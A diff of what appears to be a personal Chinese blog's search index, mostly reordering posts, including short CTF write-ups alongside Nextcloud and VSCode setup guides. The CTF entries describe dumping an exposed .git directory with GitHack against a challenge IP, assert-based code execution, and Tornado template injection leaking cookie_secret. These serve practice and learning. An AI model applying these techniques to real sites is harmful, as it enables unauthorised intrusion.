class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -812,8 +812,8 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>文件上传</tag>
         <tag>代码审计</tag>
@@ -831,8 +831,8 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>rce</tag>
         <tag>命令执行</tag>
       </tags>
@@ -874,8 +874,8 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>测试工具</tag>
       </tags>
@@ -907,34 +907,10 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>反序列化</tag>
         <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20211015</title>
-    <url>/posts/2348a06e/</url>
-    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
-<p>模板注入</p>
-</blockquote>
-<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
-<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
-<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
-<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
-<p>而RequestHandler.settings又指向self.application.settings</p>
-<p>所有handler.settings就指向RequestHandler.application.settings</p>
-<p>可以获得一些设置</p>
-<p>然后成功获得cookie_secret，md5获得hash值即可</p>
-<p>在msg页面可以实现模板注入</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -975,27 +951,34 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>代码审计</tag>
         <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
-    <title>2021Roke</title>
-    <url>/posts/46047524/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>20211018</title>
-    <url>/posts/5df9dcd3/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
+    <title>20211015</title>
+    <url>/posts/2348a06e/</url>
+    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
+<p>模板注入</p>
+</blockquote>
+<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
+<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
+<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
+<p>而RequestHandler.settings又指向self.application.settings</p>
+<p>所有handler.settings就指向RequestHandler.application.settings</p>
+<p>可以获得一些设置</p>
+<p>然后成功获得cookie_secret，md5获得hash值即可</p>
+<p>在msg页面可以实现模板注入</p>
+]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1015,9 +998,21 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211018</title>
+    <url>/posts/5df9dcd3/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1035,6 +1030,11 @@ Submit
       <categories>
         <category>随笔</category>
       </categories>
+  </entry>
+  <entry>
+    <title>2021Roke</title>
+    <url>/posts/46047524/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>2021秋季赛部分wp</title>
@@ -1093,16 +1093,9 @@ Submit
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>58.245.43.163</title>
-    <url>/posts/b47b00b2/</url>
-    <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
-<p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
-]]></content>
   </entry>
   <entry>
     <title>CUMTCTF春季赛部分writeup</title>
@@ -1204,6 +1197,31 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
+    <title>58.245.43.163</title>
+    <url>/posts/b47b00b2/</url>
+    <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
+<p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>V&amp;NCTF2021</title>
+    <url>/posts/6dd4bc92/</url>
+    <content><![CDATA[<blockquote>
+<p>部分wp</p>
+</blockquote>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
+<p>原理如下，并不是很复杂：</p>
+<p>首先将图片看作信号,</p>
+<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CUMT初夏赛部分wp</title>
     <url>/posts/b061f28/</url>
     <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
@@ -1271,24 +1289,6 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
-    <title>V&amp;NCTF2021</title>
-    <url>/posts/6dd4bc92/</url>
-    <content><![CDATA[<blockquote>
-<p>部分wp</p>
-</blockquote>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
-<p>原理如下，并不是很复杂：</p>
-<p>首先将图片看作信号,</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VSCode简单配置C艹环境</title>
     <url>/posts/c150e260/</url>
     <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
@@ -1324,6 +1324,68 @@ print(&#39;&#39;.join(flag))
       <categories>
         <category>哎，我就是玩</category>
       </categories>
+  </entry>
+  <entry>
+    <title>nextcloud安装及踩坑指南</title>
+    <url>/posts/aa5139ab/</url>
+    <content><![CDATA[<blockquote>
+<p>服务器除了用来搭博客和内网穿透之外没干其他的，感觉有点浪费，今天简简单单搭了个网盘打算榨干它。</p>
+</blockquote>
+<h1 id="私有云选择"><a href="#私有云选择" class="headerlink" title="私有云选择"></a>私有云选择</h1><p>尝试了以下几个</p>
+<ol>
+<li>cloudreve</li>
+<li>seafile</li>
+<li>nextcloud</li>
+</ol>
+<p> cloudreve比较nt，属于傻瓜式，这个不展开了</p>
+<p>seafile就比较复杂，不过有详细的<a href="https://cloud.seafile.com/published/seafile-manual-cn/home.md">官方文档</a>，一步一步来就行，我最后搭建成功了，但无法外网访问，应该是反向代理的问题，nginx反向代理配置这比较复杂。</p>
+<p>最后选择的是nextcloud,感觉用起来和onedrive差不多，不过既然是榨干服务器，就不管这么多了。</p>
+<h1 id="安装指南"><a href="#安装指南" class="headerlink" title="安装指南"></a>安装指南</h1><h2 id="服务器安装宝塔面板和LNMP环境"><a href="#服务器安装宝塔面板和LNMP环境" class="headerlink" title="服务器安装宝塔面板和LNMP环境"></a>服务器安装宝塔面板和LNMP环境</h2><p>这个在阿里云可以一键配置，不过重装的话要慎重。</p>
+<p><img src="https://img-blog.csdnimg.cn/4f9f34086cac44848091876038542157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>安装的教程也一大堆，这个比较简单。</p>
+<h2 id="新建站点"><a href="#新建站点" class="headerlink" title="新建站点"></a>新建站点</h2><p>马赛克处是域名和站点目录，php版本记得选择7.2以上的</p>
+<p><img src="https://img-blog.csdnimg.cn/ae965156e3274e97a1edd3e6de6cc00f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/ec6309d6b2ae4bc4afcca9c45776905a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="部署nextcloud"><a href="#部署nextcloud" class="headerlink" title="部署nextcloud"></a>部署nextcloud</h2><p>在<a href="https://nextcloud.com/install/#instructions-server">官网</a>下载nextcloud,下载完是一个压缩包，上传到刚建立的站点目录上，在线解压，如图</p>
+<p><img src="https://img-blog.csdnimg.cn/c413fb8bf47948b7b4b87ecfc0db7e9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后直接访问刚才绑定的域名，会让配置管理员等。进来之后就是这个了。</p>
+<p><img src="https://img-blog.csdnimg.cn/029643a8e43b4bad8077560c12de1dc4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>感觉相当于网页版的onedrive，客户端涵盖主流设备可以在官网或控制台下载也可以直接用网页版的，客户端需要绑定域名。</p>
+<p><strong>enjoy!</strong></p>
+<h1 id="踩坑指南"><a href="#踩坑指南" class="headerlink" title="踩坑指南"></a>踩坑指南</h1><h2 id="不要使用php那个安装方法"><a href="#不要使用php那个安装方法" class="headerlink" title="不要使用php那个安装方法"></a>不要使用php那个安装方法</h2><p>亲测网速太慢，160MB安装到什么时候，过一会就502，这个方法不建议</p>
+<p><img src="https://img-blog.csdnimg.cn/c34a492054e94984b7be2ce12b42b667.png" alt="在这里插入图片描述"></p>
+<h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><p>7.2以上，太低不支持。</p>
+<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir()"></a>open_basedir()</h2><p>不要在宝塔开防止跨站攻击，会禁用这个函数，然后会一直报错。</p>
+<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><p><img src="https://img-blog.csdnimg.cn/f3e47df24bb340fc86059b5a6350cfa5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="win客户端"><a href="#win客户端" class="headerlink" title="win客户端"></a>win客户端</h2><p><img src="https://img-blog.csdnimg.cn/159c13e5061941968b962190c8c02a6f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b4380ed44fc64812b81efbf854040122.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>跟onedrive好像，也是直接把文件拖到工作区就能上传，还能自动同步。</p>
+</blockquote>
+<h2 id="android客户端"><a href="#android客户端" class="headerlink" title="android客户端"></a>android客户端</h2><p><img src="https://img-blog.csdnimg.cn/29ae730f74764937b67f756ccdf7e13e.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="请添加图片描述"></p>
+<blockquote>
+<p>UI不错</p>
+</blockquote>
+<hr>
+<h1 id="挂载oss"><a href="#挂载oss" class="headerlink" title="挂载oss"></a>挂载oss</h1><blockquote>
+<p>oss用来当图床有点浪费,可以利用ossfs挂载到服务器上</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/7a49ae9e71b64f3f92358d5534d3da36.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><del>一共256T，能装好多小姐姐</del></p>
+<ol>
+<li><p><a href="https://help.aliyun.com/document_detail/153892.html?spm=a2c4g.11186623.6.903.692e7a74lkBKbz">官方文档</a>有详细操作，先把bucket挂载到文件夹</p>
+</li>
+<li><p>在nextcloud开启externalstorage，在设置中外部存储选则挂载的位置<br><img src="https://img-blog.csdnimg.cn/d663518b1e624535a6095021f7006900.png" alt="在这里插入图片描述"></p>
+</li>
+</ol>
+<p> 宝塔可以直接识别，好爽</p>
+<p><img src="https://img-blog.csdnimg.cn/b1bc5b927f72461ca5c8acfafaa18a18.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>哎，我就是玩</category>
+      </categories>
+      <tags>
+        <tag>server</tag>
+      </tags>
   </entry>
   <entry>
     <title>git学习</title>
@@ -1431,68 +1493,6 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
-    <title>nextcloud安装及踩坑指南</title>
-    <url>/posts/aa5139ab/</url>
-    <content><![CDATA[<blockquote>
-<p>服务器除了用来搭博客和内网穿透之外没干其他的，感觉有点浪费，今天简简单单搭了个网盘打算榨干它。</p>
-</blockquote>
-<h1 id="私有云选择"><a href="#私有云选择" class="headerlink" title="私有云选择"></a>私有云选择</h1><p>尝试了以下几个</p>
-<ol>
-<li>cloudreve</li>
-<li>seafile</li>
-<li>nextcloud</li>
-</ol>
-<p> cloudreve比较nt，属于傻瓜式，这个不展开了</p>
-<p>seafile就比较复杂，不过有详细的<a href="https://cloud.seafile.com/published/seafile-manual-cn/home.md">官方文档</a>，一步一步来就行，我最后搭建成功了，但无法外网访问，应该是反向代理的问题，nginx反向代理配置这比较复杂。</p>
-<p>最后选择的是nextcloud,感觉用起来和onedrive差不多，不过既然是榨干服务器，就不管这么多了。</p>
-<h1 id="安装指南"><a href="#安装指南" class="headerlink" title="安装指南"></a>安装指南</h1><h2 id="服务器安装宝塔面板和LNMP环境"><a href="#服务器安装宝塔面板和LNMP环境" class="headerlink" title="服务器安装宝塔面板和LNMP环境"></a>服务器安装宝塔面板和LNMP环境</h2><p>这个在阿里云可以一键配置，不过重装的话要慎重。</p>
-<p><img src="https://img-blog.csdnimg.cn/4f9f34086cac44848091876038542157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>安装的教程也一大堆，这个比较简单。</p>
-<h2 id="新建站点"><a href="#新建站点" class="headerlink" title="新建站点"></a>新建站点</h2><p>马赛克处是域名和站点目录，php版本记得选择7.2以上的</p>
-<p><img src="https://img-blog.csdnimg.cn/ae965156e3274e97a1edd3e6de6cc00f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/ec6309d6b2ae4bc4afcca9c45776905a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="部署nextcloud"><a href="#部署nextcloud" class="headerlink" title="部署nextcloud"></a>部署nextcloud</h2><p>在<a href="https://nextcloud.com/install/#instructions-server">官网</a>下载nextcloud,下载完是一个压缩包，上传到刚建立的站点目录上，在线解压，如图</p>
-<p><img src="https://img-blog.csdnimg.cn/c413fb8bf47948b7b4b87ecfc0db7e9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>然后直接访问刚才绑定的域名，会让配置管理员等。进来之后就是这个了。</p>
-<p><img src="https://img-blog.csdnimg.cn/029643a8e43b4bad8077560c12de1dc4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>感觉相当于网页版的onedrive，客户端涵盖主流设备可以在官网或控制台下载也可以直接用网页版的，客户端需要绑定域名。</p>
-<p><strong>enjoy!</strong></p>
-<h1 id="踩坑指南"><a href="#踩坑指南" class="headerlink" title="踩坑指南"></a>踩坑指南</h1><h2 id="不要使用php那个安装方法"><a href="#不要使用php那个安装方法" class="headerlink" title="不要使用php那个安装方法"></a>不要使用php那个安装方法</h2><p>亲测网速太慢，160MB安装到什么时候，过一会就502，这个方法不建议</p>
-<p><img src="https://img-blog.csdnimg.cn/c34a492054e94984b7be2ce12b42b667.png" alt="在这里插入图片描述"></p>
-<h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><p>7.2以上，太低不支持。</p>
-<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir()"></a>open_basedir()</h2><p>不要在宝塔开防止跨站攻击，会禁用这个函数，然后会一直报错。</p>
-<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><p><img src="https://img-blog.csdnimg.cn/f3e47df24bb340fc86059b5a6350cfa5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="win客户端"><a href="#win客户端" class="headerlink" title="win客户端"></a>win客户端</h2><p><img src="https://img-blog.csdnimg.cn/159c13e5061941968b962190c8c02a6f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b4380ed44fc64812b81efbf854040122.png" alt="在这里插入图片描述"></p>
-<blockquote>
-<p>跟onedrive好像，也是直接把文件拖到工作区就能上传，还能自动同步。</p>
-</blockquote>
-<h2 id="android客户端"><a href="#android客户端" class="headerlink" title="android客户端"></a>android客户端</h2><p><img src="https://img-blog.csdnimg.cn/29ae730f74764937b67f756ccdf7e13e.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="请添加图片描述"></p>
-<blockquote>
-<p>UI不错</p>
-</blockquote>
-<hr>
-<h1 id="挂载oss"><a href="#挂载oss" class="headerlink" title="挂载oss"></a>挂载oss</h1><blockquote>
-<p>oss用来当图床有点浪费,可以利用ossfs挂载到服务器上</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/7a49ae9e71b64f3f92358d5534d3da36.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><del>一共256T，能装好多小姐姐</del></p>
-<ol>
-<li><p><a href="https://help.aliyun.com/document_detail/153892.html?spm=a2c4g.11186623.6.903.692e7a74lkBKbz">官方文档</a>有详细操作，先把bucket挂载到文件夹</p>
-</li>
-<li><p>在nextcloud开启externalstorage，在设置中外部存储选则挂载的位置<br><img src="https://img-blog.csdnimg.cn/d663518b1e624535a6095021f7006900.png" alt="在这里插入图片描述"></p>
-</li>
-</ol>
-<p> 宝塔可以直接识别，好爽</p>
-<p><img src="https://img-blog.csdnimg.cn/b1bc5b927f72461ca5c8acfafaa18a18.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>哎，我就是玩</category>
-      </categories>
-      <tags>
-        <tag>server</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python实现校园网自动登录</title>
     <url>/posts/cfeeb04a/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
@@ -1537,8 +1537,8 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <category>开发工具</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1582,7 +1582,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#105;&#107;&#97;&#101;&#x6b;&#107;&#x6b;&#64;&#100;&#x69;&#110;&#x67;&#x74;&#97;&#108;&#107;&#46;&#99;&#111;&#x6d;">&#105;&#107;&#97;&#101;&#x6b;&#107;&#x6b;&#64;&#100;&#x69;&#110;&#x67;&#x74;&#97;&#108;&#107;&#46;&#99;&#111;&#x6d;</a></p>
+<p>邮箱： <a href="mailto:&#105;&#x6b;&#97;&#x65;&#107;&#x6b;&#x6b;&#64;&#100;&#105;&#x6e;&#103;&#116;&#97;&#x6c;&#107;&#x2e;&#x63;&#111;&#109;">&#105;&#x6b;&#97;&#x65;&#107;&#x6b;&#x6b;&#64;&#100;&#105;&#x6e;&#103;&#116;&#97;&#x6c;&#107;&#x2e;&#x63;&#111;&#109;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -1683,19 +1683,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>博客主站点关闭通知</title>
-    <url>/posts/9fc12a02/</url>
-    <content><![CDATA[<p>受某种神秘力量的影响，从昨天早上开始，服务器cpu一直爆红，刚排除了一下是git的问题，重启也没用</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
-<p>kill掉git的进程后，只要我重新push，cpu又会重新拉到100，原因我也不清楚，导致博客无法推送到服务器，现在已启用github上的备用博客，已将域名<a href="https://haorical.xyz/">https://haorical.xyz</a>解析到位于github上的博客地址<a href="https://haorical.github.io/">https://haorical.github.io</a>，可能会造成访问速度变慢等问题。</p>
-<p>服务器问题明天我再研究一下，现在服务器已经停了，包括运行的其他网站以及api接口暂时全部无法使用，我会尽快恢复。</p>
-<p><strong>哎！马老师，发生什么事了？</strong></p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>反弹shell测试</title>
     <url>/posts/9f6aba72/</url>
     <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机为一台ubuntu，测试机为kali，两者位于同一网段内</p>
@@ -1750,10 +1737,23 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>测试工具</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>博客主站点关闭通知</title>
+    <url>/posts/9fc12a02/</url>
+    <content><![CDATA[<p>受某种神秘力量的影响，从昨天早上开始，服务器cpu一直爆红，刚排除了一下是git的问题，重启也没用</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+<p>kill掉git的进程后，只要我重新push，cpu又会重新拉到100，原因我也不清楚，导致博客无法推送到服务器，现在已启用github上的备用博客，已将域名<a href="https://haorical.xyz/">https://haorical.xyz</a>解析到位于github上的博客地址<a href="https://haorical.github.io/">https://haorical.github.io</a>，可能会造成访问速度变慢等问题。</p>
+<p>服务器问题明天我再研究一下，现在服务器已经停了，包括运行的其他网站以及api接口暂时全部无法使用，我会尽快恢复。</p>
+<p><strong>哎！马老师，发生什么事了？</strong></p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
   <entry>
     <title>国庆赛部分赛题复现</title>
@@ -1779,75 +1779,9 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <category>ctf学习</category>
